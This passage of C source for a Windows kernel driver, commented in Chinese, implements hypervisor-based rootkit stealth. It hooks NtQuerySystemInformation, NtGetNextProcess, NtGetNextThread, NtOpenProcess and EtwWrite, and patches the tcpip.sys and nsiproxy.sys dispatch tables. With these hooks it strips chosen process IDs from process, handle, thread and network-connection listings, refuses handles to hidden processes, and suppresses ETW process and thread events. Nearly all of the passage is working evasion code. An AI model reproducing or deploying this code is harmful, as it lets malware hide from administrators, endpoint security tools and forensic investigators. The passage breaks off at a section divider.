            ULONG processId = (ULONG)handleInfo->Handles[i].UniqueProcessId;
            
            if (!NptIsProcessHidden(processId)) {
                if (i != j) {
                    RtlCopyMemory(&handleInfo->Handles[j],
                                  &handleInfo->Handles[i],
                                  sizeof(NPT_SYSTEM_HANDLE_TABLE_ENTRY_INFO_EX));
                }
                j++;
            }
        }
        
        handleInfo->NumberOfHandles = j;
    }
    __except (EXCEPTION_EXECUTE_HANDLER) {
    }
}

/*
 * 过滤会话进程信息 (SystemSessionProcessInformation, class=53)
 */
static VOID NptFilterSessionProcessList(PVOID SystemInformation)
{
    PNPT_SYSTEM_SESSION_PROCESS_INFORMATION sessionInfo;
    
    if (!SystemInformation || g_NptHiddenProcessCount == 0) {
        return;
    }
    
    __try {
        sessionInfo = (PNPT_SYSTEM_SESSION_PROCESS_INFORMATION)SystemInformation;
        
        if (sessionInfo->Buffer && sessionInfo->SizeOfBuf > sizeof(NPT_SYSTEM_PROCESS_INFO)) {
            NptFilterProcessList(sessionInfo->Buffer);
        }
    }
    __except (EXCEPTION_EXECUTE_HANDLER) {
    }
}

/*
 * 辅助函数：从句柄获取进程ID
 */
static ULONG NptGetProcessIdFromHandle(HANDLE ProcessHandle)
{
    PEPROCESS process = NULL;
    ULONG processId = 0;
    NTSTATUS status;
    
    if (ProcessHandle == NULL || ProcessHandle == NtCurrentProcess()) {
        return (ULONG)(ULONG_PTR)PsGetCurrentProcessId();
    }
    
    status = ObReferenceObjectByHandle(
        ProcessHandle,
        0,
        *PsProcessType,
        KernelMode,
        (PVOID*)&process,
        NULL
    );
    
    if (NT_SUCCESS(status) && process) {
        processId = (ULONG)(ULONG_PTR)PsGetProcessId(process);
        ObDereferenceObject(process);
    }
    
    return processId;
}

/*
 * HookedNtGetNextProcess - 跳过隐藏的进程
 */
NTSTATUS
NTAPI
NptHookedNtGetNextProcess(
    HANDLE ProcessHandle,
    ACCESS_MASK DesiredAccess,
    ULONG HandleAttributes,
    ULONG Flags,
    PHANDLE NewProcessHandle
)
{
    NTSTATUS status;
    HANDLE currentHandle = ProcessHandle;
    ULONG loopCount = 0;
    const ULONG MAX_LOOPS = 1000;
    PFN_NptNtGetNextProcess originalFunc;
    
    originalFunc = g_NptOriginalNtGetNextProcess;
    if (!originalFunc) {
        return STATUS_UNSUCCESSFUL;
    }
    
    if (g_NptHiddenProcessCount == 0) {
        return originalFunc(ProcessHandle, DesiredAccess, HandleAttributes, Flags, NewProcessHandle);
    }
    
    while (loopCount < MAX_LOOPS) {
        loopCount++;
        
        status = originalFunc(currentHandle, DesiredAccess, HandleAttributes, Flags, NewProcessHandle);
        
        if (!NT_SUCCESS(status)) {
            return status;
        }
        
        if (NewProcessHandle && *NewProcessHandle) {
            ULONG newPid = NptGetProcessIdFromHandle(*NewProcessHandle);
            
            if (newPid != 0 && NptIsProcessHidden(newPid)) {
                currentHandle = *NewProcessHandle;
                continue;
            }
        }
        
        return status;
    }
    
    return STATUS_NO_MORE_ENTRIES;
}

/*
 * HookedNtGetNextThread - 跳过隐藏进程的线程
 */
NTSTATUS
NTAPI
NptHookedNtGetNextThread(
    HANDLE ProcessHandle,
    HANDLE ThreadHandle,
    ACCESS_MASK DesiredAccess,
    ULONG HandleAttributes,
    ULONG Flags,
    PHANDLE NewThreadHandle
)
{
    PFN_NptNtGetNextThread originalFunc;
    ULONG processId;
    
    originalFunc = g_NptOriginalNtGetNextThread;
    if (!originalFunc) {
        return STATUS_UNSUCCESSFUL;
    }
    
    if (g_NptHiddenProcessCount == 0) {
        return originalFunc(ProcessHandle, ThreadHandle, DesiredAccess, HandleAttributes, Flags, NewThreadHandle);
    }
    
    processId = NptGetProcessIdFromHandle(ProcessHandle);
    if (processId != 0 && NptIsProcessHidden(processId)) {
        return STATUS_INVALID_HANDLE;
    }
    
    return originalFunc(ProcessHandle, ThreadHandle, DesiredAccess, HandleAttributes, Flags, NewThreadHandle);
}

/*
 * HookedNtOpenProcess - 阻止打开隐藏的进程
 */
NTSTATUS
NTAPI
NptHookedNtOpenProcess(
    PHANDLE ProcessHandle,
    ACCESS_MASK DesiredAccess,
    POBJECT_ATTRIBUTES ObjectAttributes,
    PCLIENT_ID ClientId
)
{
    PFN_NptNtOpenProcess originalFunc;
    
    originalFunc = g_NptOriginalNtOpenProcess;
    if (!originalFunc) {
        return STATUS_UNSUCCESSFUL;
    }
    
    if (g_NptHiddenProcessCount == 0) {
        return originalFunc(ProcessHandle, DesiredAccess, ObjectAttributes, ClientId);
    }
    
    if (ClientId != NULL) {
        __try {
            ULONG targetPid = (ULONG)(ULONG_PTR)ClientId->UniqueProcess;
            
            if (targetPid != 0 && NptIsProcessHidden(targetPid)) {
                return STATUS_INVALID_CID;
            }
        }
        __except (EXCEPTION_EXECUTE_HANDLER) {
        }
    }
    
    return originalFunc(ProcessHandle, DesiredAccess, ObjectAttributes, ClientId);
}

/*
 * HookedEtwWrite - 过滤 ETW 进程事件
 */
NTSTATUS
NTAPI
NptHookedEtwWrite(
    PVOID   RegHandle,
    PVOID   EventDescriptor,
    LPCGUID ActivityId,
    ULONG   UserDataCount,
    PVOID   UserData
)
{
    PFN_NptEtwWrite originalFunc;
    PNPT_EVENT_DESCRIPTOR eventDesc;

    originalFunc = g_NptOriginalEtwWrite;
    if (!originalFunc) {
        return STATUS_UNSUCCESSFUL;
    }

    if (g_NptHiddenProcessCount == 0) {
        return originalFunc(RegHandle, EventDescriptor, ActivityId, UserDataCount, UserData);
    }

    __try {
        if (EventDescriptor == NULL) {
            return originalFunc(RegHandle, EventDescriptor, ActivityId, UserDataCount, UserData);
        }

        eventDesc = (PNPT_EVENT_DESCRIPTOR)EventDescriptor;

        if (eventDesc->Id == NPT_ETW_PROCESS_START_EVENT_ID ||
            eventDesc->Id == NPT_ETW_PROCESS_STOP_EVENT_ID ||
            eventDesc->Id == NPT_ETW_THREAD_START_EVENT_ID ||
            eventDesc->Id == NPT_ETW_THREAD_STOP_EVENT_ID) {

            if (UserDataCount > 0 && UserData != NULL) {
                PNPT_EVENT_DATA_DESCRIPTOR dataDesc = (PNPT_EVENT_DATA_DESCRIPTOR)UserData;

                if (dataDesc->Size >= sizeof(ULONG) && dataDesc->Ptr != 0) {
                    __try {
                        ULONG eventPid = *(PULONG)(ULONG_PTR)dataDesc->Ptr;

                        if (NptIsProcessHidden(eventPid)) {
                            return STATUS_SUCCESS;
                        }
                    }
                    __except (EXCEPTION_EXECUTE_HANDLER) {
                    }
                }
            }
        }
    }
    __except (EXCEPTION_EXECUTE_HANDLER) {
    }

    return originalFunc(RegHandle, EventDescriptor, ActivityId, UserDataCount, UserData);
}

// ============================================================
// 网络连接过滤 - 底层 Hook
// ============================================================

// 前向声明
static VOID NptScanAndReplaceHiddenPids(PVOID Buffer, ULONG BufferLength);

// ObReferenceObjectByName 声明（用于获取驱动对象）
NTSYSAPI NTSTATUS NTAPI ObReferenceObjectByName(
    _In_ PUNICODE_STRING ObjectName,
    _In_ ULONG Attributes,
    _In_opt_ PACCESS_STATE AccessState,
    _In_opt_ ACCESS_MASK DesiredAccess,
    _In_ POBJECT_TYPE ObjectType,
    _In_ KPROCESSOR_MODE AccessMode,
    _Inout_opt_ PVOID ParseContext,
    _Out_ PVOID* Object
);
extern POBJECT_TYPE* IoDriverObjectType;

// tcpip.sys 和 nsiproxy.sys 驱动对象
static PDRIVER_OBJECT g_NptTcpipDriverObject = NULL;
static PDRIVER_OBJECT g_NptNsiproxyDriverObject = NULL;

// 原始派遣函数
typedef NTSTATUS (*NPT_DRIVER_DISPATCH_FUNC)(PDEVICE_OBJECT DeviceObject, PIRP Irp);
static NPT_DRIVER_DISPATCH_FUNC g_NptOriginalTcpipDeviceControl = NULL;
static NPT_DRIVER_DISPATCH_FUNC g_NptOriginalNsiproxyDeviceControl = NULL;
static NPT_DRIVER_DISPATCH_FUNC g_NptOriginalTcpipInternalDeviceControl = NULL;
static NPT_DRIVER_DISPATCH_FUNC g_NptOriginalNsiproxyInternalDeviceControl = NULL;

/*
 * Hook tcpip.sys 的 IRP_MJ_DEVICE_CONTROL
 */
static NTSTATUS
NptHookedTcpipDeviceControl(
    PDEVICE_OBJECT DeviceObject,
    PIRP Irp
)
{
    NTSTATUS status;
    PIO_STACK_LOCATION irpSp;
    PVOID outputBuffer;
    ULONG outputLength;
    
    if (!g_NptOriginalTcpipDeviceControl || g_NptHiddenProcessCount == 0) {
        if (g_NptOriginalTcpipDeviceControl) {
            return g_NptOriginalTcpipDeviceControl(DeviceObject, Irp);
        }
        return STATUS_UNSUCCESSFUL;
    }
    
    status = g_NptOriginalTcpipDeviceControl(DeviceObject, Irp);
    
    if (NT_SUCCESS(status)) {
        irpSp = IoGetCurrentIrpStackLocation(Irp);
        outputBuffer = Irp->UserBuffer;
        outputLength = (ULONG)Irp->IoStatus.Information;
        
        if (outputBuffer && outputLength > 0) {
            __try {
                NptScanAndReplaceHiddenPids(outputBuffer, outputLength);
            }
            __except (EXCEPTION_EXECUTE_HANDLER) {
            }
        }
    }
    
    return status;
}

/*
 * Hook nsiproxy.sys 的 IRP_MJ_DEVICE_CONTROL
 */
static NTSTATUS
NptHookedNsiproxyDeviceControl(
    PDEVICE_OBJECT DeviceObject,
    PIRP Irp
)
{
    NTSTATUS status;
    PIO_STACK_LOCATION irpSp;
    PVOID outputBuffer;
    ULONG outputLength;
    
    if (!g_NptOriginalNsiproxyDeviceControl || g_NptHiddenProcessCount == 0) {
        if (g_NptOriginalNsiproxyDeviceControl) {
            return g_NptOriginalNsiproxyDeviceControl(DeviceObject, Irp);
        }
        return STATUS_UNSUCCESSFUL;
    }
    
    status = g_NptOriginalNsiproxyDeviceControl(DeviceObject, Irp);
    
    if (NT_SUCCESS(status)) {
        irpSp = IoGetCurrentIrpStackLocation(Irp);
        outputBuffer = Irp->UserBuffer;
        outputLength = (ULONG)Irp->IoStatus.Information;
        
        if (outputBuffer && outputLength > 0) {
            __try {
                NptScanAndReplaceHiddenPids(outputBuffer, outputLength);
            }
            __except (EXCEPTION_EXECUTE_HANDLER) {
            }
        }
    }
    
    return status;
}

/*
 * Hook tcpip.sys 的 IRP_MJ_INTERNAL_DEVICE_CONTROL
 */
static NTSTATUS
NptHookedTcpipInternalDeviceControl(
    PDEVICE_OBJECT DeviceObject,
    PIRP Irp
)
{
    NTSTATUS status;
    PVOID outputBuffer;
    ULONG outputLength;
    
    if (!g_NptOriginalTcpipInternalDeviceControl || g_NptHiddenProcessCount == 0) {
        if (g_NptOriginalTcpipInternalDeviceControl) {
            return g_NptOriginalTcpipInternalDeviceControl(DeviceObject, Irp);
        }
        return STATUS_UNSUCCESSFUL;
    }
    
    status = g_NptOriginalTcpipInternalDeviceControl(DeviceObject, Irp);
    
    if (NT_SUCCESS(status)) {
        outputBuffer = Irp->UserBuffer;
        if (!outputBuffer) {
            outputBuffer = Irp->AssociatedIrp.SystemBuffer;
        }
        outputLength = (ULONG)Irp->IoStatus.Information;
        
        if (outputBuffer && outputLength > 0) {
            __try {
                NptScanAndReplaceHiddenPids(outputBuffer, outputLength);
            }
            __except (EXCEPTION_EXECUTE_HANDLER) {
            }
        }
    }
    
    return status;
}

/*
 * Hook nsiproxy.sys 的 IRP_MJ_INTERNAL_DEVICE_CONTROL
 */
static NTSTATUS
NptHookedNsiproxyInternalDeviceControl(
    PDEVICE_OBJECT DeviceObject,
    PIRP Irp
)
{
    NTSTATUS status;
    PVOID outputBuffer;
    ULONG outputLength;
    
    if (!g_NptOriginalNsiproxyInternalDeviceControl || g_NptHiddenProcessCount == 0) {
        if (g_NptOriginalNsiproxyInternalDeviceControl) {
            return g_NptOriginalNsiproxyInternalDeviceControl(DeviceObject, Irp);
        }
        return STATUS_UNSUCCESSFUL;
    }
    
    status = g_NptOriginalNsiproxyInternalDeviceControl(DeviceObject, Irp);
    
    if (NT_SUCCESS(status)) {
        outputBuffer = Irp->UserBuffer;
        if (!outputBuffer) {
            outputBuffer = Irp->AssociatedIrp.SystemBuffer;
        }
        outputLength = (ULONG)Irp->IoStatus.Information;
        
        if (outputBuffer && outputLength > 0) {
            __try {
                NptScanAndReplaceHiddenPids(outputBuffer, outputLength);
            }
            __except (EXCEPTION_EXECUTE_HANDLER) {
            }
        }
    }
    
    return status;
}

/*
 * 安装驱动派遣函数 Hook (支持指定 MajorFunction)
 */
static NTSTATUS NptInstallDriverDispatchHookEx(
    PCWSTR DriverName,
    UCHAR MajorFunction,
    PDRIVER_OBJECT *OutDriverObject,
    NPT_DRIVER_DISPATCH_FUNC *OriginalFunc,
    NPT_DRIVER_DISPATCH_FUNC NewFunc
)
{
    NTSTATUS status;
    UNICODE_STRING driverPath;
    WCHAR fullPath[256];
    PDRIVER_OBJECT driverObject = NULL;
    
    RtlStringCchPrintfW(fullPath, 256, L"\\Driver\\%ws", DriverName);
    RtlInitUnicodeString(&driverPath, fullPath);
    
    if (*OutDriverObject != NULL) {
        driverObject = *OutDriverObject;
    } else {
        status = ObReferenceObjectByName(
            &driverPath,
            OBJ_CASE_INSENSITIVE,
            NULL,
            0,
            *IoDriverObjectType,
            KernelMode,
            NULL,
            (PVOID*)&driverObject
        );
        
        if (!NT_SUCCESS(status)) {
            DbgPrint("[NPT-Hook] Failed to find driver %ws: 0x%X\n", DriverName, status);
            return status;
        }
        
        *OutDriverObject = driverObject;
    }
    
    *OriginalFunc = (NPT_DRIVER_DISPATCH_FUNC)driverObject->MajorFunction[MajorFunction];
    
    InterlockedExchangePointer(
        (PVOID*)&driverObject->MajorFunction[MajorFunction],
        (PVOID)NewFunc
    );
    
    DbgPrint("[NPT-Hook] Hooked %ws MajorFunction[%d]: %p -> %p\n",
        DriverName, MajorFunction, *OriginalFunc, NewFunc);
    
    return STATUS_SUCCESS;
}

/*
 * 安装驱动派遣函数 Hook (IRP_MJ_DEVICE_CONTROL)
 */
static NTSTATUS NptInstallDriverDispatchHook(
    PCWSTR DriverName,
    PDRIVER_OBJECT *OutDriverObject,
    NPT_DRIVER_DISPATCH_FUNC *OriginalFunc,
    NPT_DRIVER_DISPATCH_FUNC NewFunc
)
{
    return NptInstallDriverDispatchHookEx(
        DriverName,
        IRP_MJ_DEVICE_CONTROL,
        OutDriverObject,
        OriginalFunc,
        NewFunc
    );
}

/*
 * 安装网络驱动 Hook
 */
static VOID NptInstallNetworkDriverHooks(VOID)
{
    NTSTATUS status;
    
    // Hook tcpip.sys IRP_MJ_DEVICE_CONTROL
    if (g_NptTcpipDriverObject == NULL) {
        status = NptInstallDriverDispatchHook(
            L"tcpip",
            &g_NptTcpipDriverObject,
            &g_NptOriginalTcpipDeviceControl,
            NptHookedTcpipDeviceControl
        );
        if (NT_SUCCESS(status)) {
            DbgPrint("[NPT-Hook] tcpip.sys IRP_MJ_DEVICE_CONTROL hook installed\n");
        }
    }
    
    // Hook tcpip.sys IRP_MJ_INTERNAL_DEVICE_CONTROL
    if (g_NptTcpipDriverObject != NULL && g_NptOriginalTcpipInternalDeviceControl == NULL) {
        status = NptInstallDriverDispatchHookEx(
            L"tcpip",
            IRP_MJ_INTERNAL_DEVICE_CONTROL,
            &g_NptTcpipDriverObject,
            &g_NptOriginalTcpipInternalDeviceControl,
            NptHookedTcpipInternalDeviceControl
        );
        if (NT_SUCCESS(status)) {
            DbgPrint("[NPT-Hook] tcpip.sys hook installed\n");
        }
    }
    
    // Hook nsiproxy.sys IRP_MJ_DEVICE_CONTROL
    if (g_NptNsiproxyDriverObject == NULL) {
        status = NptInstallDriverDispatchHook(
            L"nsiproxy",
            &g_NptNsiproxyDriverObject,
            &g_NptOriginalNsiproxyDeviceControl,
            NptHookedNsiproxyDeviceControl
        );
        if (NT_SUCCESS(status)) {
            DbgPrint("[NPT-Hook] nsiproxy.sys IRP_MJ_DEVICE_CONTROL hook installed\n");
        }
    }
    
    // Hook nsiproxy.sys IRP_MJ_INTERNAL_DEVICE_CONTROL
    if (g_NptNsiproxyDriverObject != NULL && g_NptOriginalNsiproxyInternalDeviceControl == NULL) {
        status = NptInstallDriverDispatchHookEx(
            L"nsiproxy",
            IRP_MJ_INTERNAL_DEVICE_CONTROL,
            &g_NptNsiproxyDriverObject,
            &g_NptOriginalNsiproxyInternalDeviceControl,
            NptHookedNsiproxyInternalDeviceControl
        );
        if (NT_SUCCESS(status)) {
            DbgPrint("[NPT-Hook] nsiproxy.sys IRP_MJ_INTERNAL_DEVICE_CONTROL hook installed\n");
        }
    }
}

// ============================================================
// 网络连接过滤函数
// ============================================================

static VOID NptFilterTcpTable(PVOID OutputBuffer, ULONG OutputBufferLength)
{
    PNPT_MIB_TCPTABLE_OWNER_PID tcpTable;
    ULONG i, j;
    
    if (!OutputBuffer || OutputBufferLength < sizeof(NPT_MIB_TCPTABLE_OWNER_PID)) {
        return;
    }
    
    __try {
        tcpTable = (PNPT_MIB_TCPTABLE_OWNER_PID)OutputBuffer;
        
        if (tcpTable->dwNumEntries == 0) {
            return;
        }
        
        j = 0;
        for (i = 0; i < tcpTable->dwNumEntries; i++) {
            ULONG pid = tcpTable->table[i].dwOwningPid;
            
            if (!NptIsProcessHidden(pid)) {
                if (i != j) {
                    RtlCopyMemory(&tcpTable->table[j], &tcpTable->table[i],
                                  sizeof(NPT_MIB_TCPROW_OWNER_PID));
                }
                j++;
            }
        }
        
        tcpTable->dwNumEntries = j;
    }
    __except (EXCEPTION_EXECUTE_HANDLER) {
    }
}

static VOID NptFilterUdpTable(PVOID OutputBuffer, ULONG OutputBufferLength)
{
    PNPT_MIB_UDPTABLE_OWNER_PID udpTable;
    ULONG i, j;
    
    if (!OutputBuffer || OutputBufferLength < sizeof(NPT_MIB_UDPTABLE_OWNER_PID)) {
        return;
    }
    
    __try {
        udpTable = (PNPT_MIB_UDPTABLE_OWNER_PID)OutputBuffer;
        
        if (udpTable->dwNumEntries == 0) {
            return;
        }
        
        j = 0;
        for (i = 0; i < udpTable->dwNumEntries; i++) {
            ULONG pid = udpTable->table[i].dwOwningPid;
            
            if (!NptIsProcessHidden(pid)) {
                if (i != j) {
                    RtlCopyMemory(&udpTable->table[j], &udpTable->table[i],
                                  sizeof(NPT_MIB_UDPROW_OWNER_PID));
                }
                j++;
            }
        }
        
        udpTable->dwNumEntries = j;
    }
    __except (EXCEPTION_EXECUTE_HANDLER) {
    }
}

/*
 * 直接扫描并替换输出缓冲区中的隐藏 PID
 */
static VOID NptScanAndReplaceHiddenPids(PVOID Buffer, ULONG BufferLength)
{
    PULONG data;
    ULONG i;
    ULONG count;
    ULONG replaced = 0;
    
    if (!Buffer || BufferLength < sizeof(ULONG) * 2) {
        return;
    }
    
    // 检查地址是否有效
    if ((ULONG_PTR)Buffer < 0x10000) {
        return;
    }
    
    __try {
        data = (PULONG)Buffer;
        count = BufferLength / sizeof(ULONG);
        
        if (count > 100000) {
            count = 100000;
        }
        
        for (i = 0; i < count; i++) {
            ULONG value = data[i];
            
            // 检查是否是合理的 PID 范围并且是隐藏的进程
            if (value >= 4 && value < 65536 && NptIsProcessHidden(value)) {
                data[i] = 0;
                replaced++;
            }
        }
    }
    __except (EXCEPTION_EXECUTE_HANDLER) {
    }
}

NTSTATUS
NTAPI
NptHookedNtDeviceIoControlFile(
    HANDLE FileHandle,
    HANDLE Event,
    PIO_APC_ROUTINE ApcRoutine,
    PVOID ApcContext,
    PIO_STATUS_BLOCK IoStatusBlock,
    ULONG IoControlCode,
    PVOID InputBuffer,
    ULONG InputBufferLength,
    PVOID OutputBuffer,
    ULONG OutputBufferLength
)
{
    NTSTATUS status;
    PFN_NptNtDeviceIoControlFile originalFunc;
    ULONG actualLength = 0;
    static LONG callCount = 0;
    LONG currentCall;
    
    originalFunc = g_NptOriginalNtDeviceIoControlFile;
    if (!originalFunc) {
        return STATUS_UNSUCCESSFUL;
    }
    
    status = originalFunc(
        FileHandle, Event, ApcRoutine, ApcContext, IoStatusBlock,
        IoControlCode, InputBuffer, InputBufferLength, OutputBuffer, OutputBufferLength
    );
    
    if (!NT_SUCCESS(status) || g_NptHiddenProcessCount == 0 || OutputBuffer == NULL) {
        return status;
    }
    
    // 调试输出
    currentCall = InterlockedIncrement(&callCount);
    if ((currentCall % 1000) == 1) {
        DbgPrint("[NPT-Hook] NptHookedNtDeviceIoControlFile called %d times, IOCTL=0x%X\n",
            currentCall, IoControlCode);
    }
    
    // 获取实际返回的数据长度
    __try {
        if (IoStatusBlock != NULL) {
            actualLength = (ULONG)IoStatusBlock->Information;
        }
    }
    __except (EXCEPTION_EXECUTE_HANDLER) {
        actualLength = OutputBufferLength;
    }
    
    if (actualLength == 0) {
        actualLength = OutputBufferLength;
    }
    
    if (actualLength < 8) {
        return status;
    }
    
    __try {
        // 策略1: 结构化过滤
        if (actualLength >= sizeof(NPT_MIB_TCPTABLE_OWNER_PID)) {
            PNPT_MIB_TCPTABLE_OWNER_PID table = (PNPT_MIB_TCPTABLE_OWNER_PID)OutputBuffer;
            
            if (table->dwNumEntries > 0 && table->dwNumEntries < 10000) {
                SIZE_T minSize = sizeof(ULONG) + table->dwNumEntries * sizeof(NPT_MIB_TCPROW_OWNER_PID);
                if (actualLength >= minSize) {
                    NptFilterTcpTable(OutputBuffer, actualLength);
                }
            }
        }
        
        if (actualLength >= sizeof(NPT_MIB_UDPTABLE_OWNER_PID)) {
            PNPT_MIB_UDPTABLE_OWNER_PID table = (PNPT_MIB_UDPTABLE_OWNER_PID)OutputBuffer;
            
            if (table->dwNumEntries > 0 && table->dwNumEntries < 10000) {
                SIZE_T minSize = sizeof(ULONG) + table->dwNumEntries * sizeof(NPT_MIB_UDPROW_OWNER_PID);
                if (actualLength >= minSize) {
                    NptFilterUdpTable(OutputBuffer, actualLength);
                }
            }
        }
        
        // 策略2: 直接扫描并替换隐藏的 PID
        NptScanAndReplaceHiddenPids(OutputBuffer, actualLength);
    }
    __except (EXCEPTION_EXECUTE_HANDLER) {
        DbgPrint("[NPT-Hook] Exception in NptHookedNtDeviceIoControlFile filter\n");
    }
    
    return status;
}

NTSTATUS
NTAPI
NptHookedNtQuerySystemInformation(
    ULONG SystemInformationClass,
    PVOID SystemInformation,
    ULONG SystemInformationLength,
    PULONG ReturnLength
)
{
    NTSTATUS status;
    PFN_NptNtQuerySystemInformation originalFunc;
    static volatile LONG callCount = 0;
    LONG currentCall;
    
    currentCall = InterlockedIncrement(&callCount);
    if (currentCall <= 3) {
        DbgPrint("[NPT-Hook] NtQuerySystemInformation #%d, Class=%d\n", currentCall, SystemInformationClass);
    }
    
#if NPT_HOOK_TEST_NO_CALL
    return STATUS_NOT_IMPLEMENTED;
#endif
    
    originalFunc = g_NptOriginalNtQuerySystemInformation;
    if (!originalFunc) {
        return STATUS_UNSUCCESSFUL;
    }
    
    __try {
        status = originalFunc(
            SystemInformationClass,
            SystemInformation,
            SystemInformationLength,
            ReturnLength
        );
    }
    __except (EXCEPTION_EXECUTE_HANDLER) {
        return GetExceptionCode();
    }
    
    // 只在成功时进行过滤
    if (!NT_SUCCESS(status) || SystemInformation == NULL) {
        return status;
    }
    
    // 根据信息类进行过滤
    __try {
        switch (SystemInformationClass) {
        
        // ============================================================
        // 进程信息过滤
        // ============================================================
        case NptSystemProcessInformation:           // 5
        case NptSystemExtendedProcessInformation:   // 57
        case NptSystemFullProcessInformation:       // 148
            if (g_NptHiddenProcessCount > 0 &&
                SystemInformationLength >= sizeof(NPT_SYSTEM_PROCESS_INFO)) {
                NptFilterProcessList(SystemInformation);
            }
            break;
        
        // ============================================================
        // 会话进程信息过滤
        // ============================================================
        case NptSystemSessionProcessInformation:    // 53
            if (g_NptHiddenProcessCount > 0 &&
                SystemInformationLength >= sizeof(NPT_SYSTEM_SESSION_PROCESS_INFORMATION)) {
                NptFilterSessionProcessList(SystemInformation);
            }
            break;
        
        // ============================================================
        // 句柄信息过滤
        // ============================================================
        case NptSystemHandleInformation:            // 16
            if (g_NptHiddenProcessCount > 0 &&
                SystemInformationLength >= sizeof(NPT_SYSTEM_HANDLE_INFORMATION)) {
                NptFilterHandleList(SystemInformation, SystemInformationLength);
            }
            break;
        
        case NptSystemExtendedHandleInformation:    // 64
            if (g_NptHiddenProcessCount > 0 &&
                SystemInformationLength >= sizeof(NPT_SYSTEM_HANDLE_INFORMATION_EX)) {
                NptFilterExtendedHandleList(SystemInformation, SystemInformationLength);
            }
            break;
        
        default:
            break;
        }
    }
    __except (EXCEPTION_EXECUTE_HANDLER) {
    }
    
    return status;
}

NTSTATUS
NptHookHideProcess(
    _In_ ULONG ProcessId
)
{
    NTSTATUS status;
    UNICODE_STRING funcName;
    PVOID ntQuerySystemInformation;
    
    DbgPrint("[NPT-Hook] ============ NptHookHideProcess START ============\n");
    
    if (ProcessId != 0) {
        NptAddHiddenProcess(ProcessId);
    }
    
    // 检查是否所有进程隐藏相关的 Hook 都已安装
    // 注意：NtDeviceIoControlFile Hook 已禁用（导致系统不稳定）
    if (g_NptNtQuerySystemInformationHook != NULL && 
        g_NptNtGetNextProcessHook != NULL) {
        DbgPrint("[NPT-Hook] All process hiding hooks already installed\n");
        return STATUS_SUCCESS;
    }
    
    DbgPrint("[NPT-Hook] Installing additional process hiding hooks...\n");
    
    if (!g_HypervisorContext.IsActive) {
        DbgPrint("[NPT-Hook] Hypervisor not active\n");
        return STATUS_UNSUCCESSFUL;
    }
    
    // 安装 NtQuerySystemInformation Hook (如果尚未安装)
    if (g_NptNtQuerySystemInformationHook == NULL) {
        RtlInitUnicodeString(&funcName, L"NtQuerySystemInformation");
        ntQuerySystemInformation = MmGetSystemRoutineAddress(&funcName);
        
        if (!ntQuerySystemInformation) {
            DbgPrint("[NPT-Hook] Failed to find NtQuerySystemInformation\n");
            return STATUS_NOT_FOUND;
        }
        
        DbgPrint("[NPT-Hook] NtQuerySystemInformation at %p\n", ntQuerySystemInformation);
        
        status = NptHookInstall(
            ntQuerySystemInformation,
            NptHookedNtQuerySystemInformation,
            &g_NptNtQuerySystemInformationHook
        );
        
        if (NT_SUCCESS(status)) {
            g_NptOriginalNtQuerySystemInformation = 
                (PFN_NptNtQuerySystemInformation)NptHookGetTrampoline(g_NptNtQuerySystemInformationHook);
            
            DbgPrint("[NPT-Hook] NtQuerySystemInformation hook installed\n");
            DbgPrint("[NPT-Hook] Trampoline at %p\n", g_NptOriginalNtQuerySystemInformation);
        } else {
            DbgPrint("[NPT-Hook] NtQuerySystemInformation hook failed: 0x%X\n", status);
            return status;
        }
    } else {
        DbgPrint("[NPT-Hook] NtQuerySystemInformation hook already installed, skipping\n");
    }
    
    // ============================================================
    // 安装 NtGetNextProcess Hook
    // ============================================================
    {
        PVOID ntGetNextProcess;
        RtlInitUnicodeString(&funcName, L"NtGetNextProcess");
        ntGetNextProcess = MmGetSystemRoutineAddress(&funcName);
        
        if (ntGetNextProcess && g_NptNtGetNextProcessHook == NULL) {
            DbgPrint("[NPT-Hook] NtGetNextProcess at %p\n", ntGetNextProcess);
            
            status = NptHookInstall(ntGetNextProcess, NptHookedNtGetNextProcess, &g_NptNtGetNextProcessHook);
            if (NT_SUCCESS(status)) {
                g_NptOriginalNtGetNextProcess = (PFN_NptNtGetNextProcess)NptHookGetTrampoline(g_NptNtGetNextProcessHook);
                DbgPrint("[NPT-Hook] NtGetNextProcess hook installed\n");
            } else {
                DbgPrint("[NPT-Hook] NtGetNextProcess hook failed: 0x%X\n", status);
            }
        }
    }
    
    // ============================================================
    // 安装 NtGetNextThread Hook
    // ============================================================
    {
        PVOID ntGetNextThread;
        RtlInitUnicodeString(&funcName, L"NtGetNextThread");
        ntGetNextThread = MmGetSystemRoutineAddress(&funcName);
        
        if (ntGetNextThread && g_NptNtGetNextThreadHook == NULL) {
            DbgPrint("[NPT-Hook] NtGetNextThread at %p\n", ntGetNextThread);
            
            status = NptHookInstall(ntGetNextThread, NptHookedNtGetNextThread, &g_NptNtGetNextThreadHook);
            if (NT_SUCCESS(status)) {
                g_NptOriginalNtGetNextThread = (PFN_NptNtGetNextThread)NptHookGetTrampoline(g_NptNtGetNextThreadHook);
                DbgPrint("[NPT-Hook] NtGetNextThread hook installed\n");
            } else {
                DbgPrint("[NPT-Hook] NtGetNextThread hook failed: 0x%X\n", status);
            }
        }
    }
    
    // ============================================================
    // 安装 NtOpenProcess Hook
    // ============================================================
    {
        PVOID ntOpenProcess;
        RtlInitUnicodeString(&funcName, L"NtOpenProcess");
        ntOpenProcess = MmGetSystemRoutineAddress(&funcName);
        
        if (ntOpenProcess && g_NptNtOpenProcessHook == NULL) {
            DbgPrint("[NPT-Hook] NtOpenProcess at %p\n", ntOpenProcess);
            
            status = NptHookInstall(ntOpenProcess, NptHookedNtOpenProcess, &g_NptNtOpenProcessHook);
            if (NT_SUCCESS(status)) {
                g_NptOriginalNtOpenProcess = (PFN_NptNtOpenProcess)NptHookGetTrampoline(g_NptNtOpenProcessHook);
                DbgPrint("[NPT-Hook] NtOpenProcess hook installed\n");
            } else {
                DbgPrint("[NPT-Hook] NtOpenProcess hook failed: 0x%X\n", status);
            }
        }
    }
    
    // ============================================================
    // 安装 ETW Hook
    // ============================================================
    {
        PVOID etwWrite;
        RtlInitUnicodeString(&funcName, L"EtwWrite");
        etwWrite = MmGetSystemRoutineAddress(&funcName);
        
        if (etwWrite && g_NptEtwWriteHook == NULL) {
            DbgPrint("[NPT-Hook] EtwWrite at %p\n", etwWrite);
            
            status = NptHookInstall(etwWrite, NptHookedEtwWrite, &g_NptEtwWriteHook);
            if (NT_SUCCESS(status)) {
                g_NptOriginalEtwWrite = (PFN_NptEtwWrite)NptHookGetTrampoline(g_NptEtwWriteHook);
                DbgPrint("[NPT-Hook] EtwWrite hook installed\n");
            } else {
                DbgPrint("[NPT-Hook] EtwWrite hook failed: 0x%X\n", status);
            }
        }
    }
    
    // ============================================================
